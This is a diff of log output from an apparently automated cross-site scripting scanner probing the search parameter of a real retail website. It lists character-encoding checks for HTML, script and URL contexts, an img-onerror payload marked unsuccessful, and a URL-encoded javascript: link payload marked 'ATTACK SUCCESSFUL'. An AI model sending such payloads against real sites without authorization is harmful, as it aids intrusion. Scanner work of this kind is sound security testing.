@@ -43,9 +43,17 @@ Same URI : [0]
 
 
 ENCODING     Presence	"	'	<	( 
-ATTR:		False	False	False	False	False
+HTML:		True	False	False	False	False
+
+Attack Payloads for HTML
+['<img src=x onerror="alert(1)">']
+
+HTML Attack Url: https://www.burpee.com/search?q=<img src=x onerror="alert(1)">
+
+ ______ UnSuccessful with payload: <img src=x onerror="alert(1)">
+
 ENCODING     Presence	"	'	<	( 
-HTML:		True	False	False	False	True
+HTML:		True	True	True	True	True
 
 Attack Payloads for HTML
 []
@@ -53,6 +61,11 @@ ENCODING     Presence	"	'	<	(
 SCRIPT:		True	True	True	True	False
 
 Attack Payloads for SCRIPT
+[]
+ENCODING     Presence	"	'	<	( 
+URL:		True	True	True	True	True
+
+Attack Payloads for URL
 []
 ENCODING     Presence	"	'	<	( 
 URL:		True	True	False	True	False
@@ -64,4 +77,4 @@ URL Attack Url: https://www.burpee.com/search?q=%3Ca+href%3D%22jaVaScripT%3AAleR
 
 => ATTACK SUCCESSFUL with Payload: %3Ca+href%3D%22jaVaScripT%3AAleRt%281%29%22%3Eclick_XYZ%3C%2Fa%3E
 Detection of Payload: 
-<form class="challenge-form" id="challenge-form" action="/search?q=%3Ca+href%3D%22jaVaScripT%3AAleRt%281%29%22%3Eclick_XYZ%3C%2Fa%3E&amp;__cf_chl_captcha_tk__=e4b857e3656ad94b356a3321062adcf1d570202a-1586146511-0-AdR5UpJXZ_qvvB15cbnCnYRh_v31J2Me6gE1n-Za1egFS56xFDb2hQOTRrFYf403QxHIe8IQLEccy3yElioPbgrJZu2_cwfPzNjgvXtl9pw95JisgJUxA6Y3oBPk8GOkTUiVYYnoxiTVmWQr7CksTA1BrUtQYUeCQJKMROdojNIOlrASfDmq8-lXkGRbG68OIWQYrLMXaCgIIV0KeP27zCYJehTbOF-oD7gas0hh8yRMH949dE5snZJUpdyYYy507jwfl43Ibh2NZFe8fsjSEdu0Cf4QMp4j4JoDh5u-DJ1BkpsSFy4r969rWoYCNUvcHZJQnqZ43ucXE67bgIB7f8hNstP5nICXvUnQ26h8IgiwP4wV7TQ09by-EAt6YtgMO4CcdlNRq5LlXO8scxkBqvukyPOcQUUhM4Zs1dzS_DmSNg96ER2gi2EzTIAxEdLXpRswiV9kpC0l36-sxM2Z4YvqEwGD3EuN-4TkFhx2NZ9rqRFdqISW_OTH9TFkdcxa_RhrTEFXQ4ApYWnEN7oSeYcJzmt2oM5oDafXZzWoLwP9Lm-nlRfTNQ2v6tFQJnchBZZynsAbq_sNi4wwViWXwlA" method="POST" enctype="application/x-www-form-urlencoded">
+<form class="challenge-form" id="challenge-form" action="/search?q=%3Ca+href%3D%22jaVaScripT%3AAleRt%281%29%22%3Eclick_XYZ%3C%2Fa%3E&amp;__cf_chl_captcha_tk__=2b1927fb2a328bf07ed58de15ffbf96c7f4e102e-1586151366-0-AZfa6kj6Cno3xZT0FRWZblmJ87-40DyLePX9fbo_kO4IbltQ-QF6OyIR02mLTbvyxQkPkNPSjR9yJKootwWVb0mPcmPlMCplcilhSIntvSO_mkC7jAr4P06DaVguAwyTX1i3fX61aITCmg-FL95ILl-v6keQ2xN1BUDaSw2Pq22UpS53TTBwsZ7jK_2CCC2JMOIGsX8OdYabUx4faCF1ibvY5uo9-fUMewcX1JNkm3gqTqm7y0G0Vc71e-gSrJV4RNrHnzK6eCD6UuqiQfb7lOvaBsNbf9zOrMLBsD2HQAIqSiSgGb_S5U0NAUwtU0rsc2Zx7O4efykYEKNN7GL573s5vEICeIbXq0mbSROlvunBC7dudYNJG4BBVW8-zl2BUwZVtxj9bVmCrRNcRHFNREfiKES3WIG1GU1KafEOcroVBSsyC3_VDcWsfPLs6oORFcS4fhn8l7o1_XJgvP525NjlJ1BCaad0yj0Oxt-4rQ_1zglaFAcVFuZbz5gZsUokfeYgOGykJVgOWqCTewzrKpaAb0U1dL3TA-vf2KG67kTGz6WnEGOqMkMO2CkMayzB_MM_EyF08CMKz5get0bolGY" method="POST" enctype="application/x-www-form-urlencoded">
